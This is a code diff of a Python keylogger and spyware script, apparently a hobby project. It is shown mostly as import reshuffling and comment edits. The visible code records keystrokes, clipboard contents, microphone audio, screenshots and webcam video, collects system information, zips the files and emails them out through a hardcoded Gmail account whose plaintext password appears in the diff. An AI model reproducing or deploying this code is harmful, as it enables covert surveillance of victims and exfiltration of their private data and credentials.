@@ -1,5 +1,3 @@
-#Logger Library
-from pynput.mouse import Controller
 from pynput.keyboard import Listener, Key
 
 #Email Library
@@ -9,34 +7,23 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-#for zipping file
-
+#Everything Else
 import win32clipboard
-
 import socket
 import platform
-
 import time
-
 import os
-
-
+import cv2
 from zipfile import ZipFile
-
 from scipy.io.wavfile import write
 import sounddevice as sd
-
 from cryptography.fernet import Fernet
-
 import getpass
 from requests import get
-
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-import cv2
-
-
+# file paths
 file_path = r"Z:\keylogger\email"
 log_file = r"\keylog.txt"
 system_file = r"\systeminfo.txt"
@@ -45,8 +32,7 @@ audio_file = r"\audio.wav"
 screenshot_file = r"\screenshot.png"
 video_file = r"\recording.avi"
 
-microphone_time = 10
-
+# email credentials
 email_address = "keyloggerproject4@gmail.com"
 password = "Keylogger12345!"
 to_address = "keyloggerproject4@gmail.com"
@@ -132,6 +118,7 @@ def copy_clipboard():
 
 def microphone():
     fs = 44100
+    microphone_time = 10
     seconds = microphone_time
 
     recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
@@ -152,7 +139,6 @@ STD_DIMENSIONS = {
     "1080p": (1920, 1080),
     "4k": (3840, 2160),
 }
-
 VIDEO_TYPE = {
     'avi': cv2.VideoWriter_fourcc(*'XVID'),
     'mp4': cv2.VideoWriter_fourcc(*'XVID'),
@@ -192,14 +178,11 @@ def webcam():
     while int(time.time() - start_time) < capture_duration:
         ret, frame = cap.read()
         out.write(frame)
-        # frame = cv2.resize(frame, None, fx=0.5,fy=0.5, interpolation=cv2.INTER_AREA)
-        c = cv2.waitKey(1)
-        if c == "q":
-            break
 
     cap.release()
     out.release()
     cv2.destroyAllWindows()
+
 
 def zip_folder(filename, filename2, filename3, filename4, filename5, filename6):
     try:
@@ -222,9 +205,9 @@ copy_clipboard()
 computer_information()
 zip_folder(email_folder + log_file, email_folder + system_file, email_folder + clipboard_file, email_folder + audio_file, email_folder + screenshot_file, email_folder + video_file)
 send_email(log_file, email_folder_zip, to_address)
+print("log was successfully archived")
 
-
-# pypnut logger methods
+# logger methods
 count = 0
 keys = []
 
